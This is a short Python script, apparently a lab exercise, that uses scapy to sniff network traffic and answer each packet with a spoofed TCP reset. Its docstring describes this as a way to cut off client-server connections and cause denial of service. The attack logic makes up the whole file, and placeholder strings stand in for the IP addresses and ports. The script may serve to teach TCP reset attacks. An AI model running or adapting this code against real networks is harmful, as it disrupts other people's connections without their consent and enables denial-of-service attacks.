#!/usr/bin/env python3

from scapy.all import *

def reset_attack(pkt):
    """ Sending a packet with the RESET bit set on behalf
    of the connection made between a client and a server will
    cause the connection to terminate. This creates a denial-of-service
    scenario because for connection established a client and a server
    will be terminated immediately after any party receives a RESET packet.
    """
    ip = IP(src="machine_a_ip", dst="machine_b_ip")
    tcp = TCP(sport="server_port", dport=pkt[TCP].sport,
              flags="R", seq=pkt[TCP].ack)

    pkt = ip/tcp
    send(pkt, verbose=0)

if __name__ == "__main__":
    sniff(prn=reset_attack)
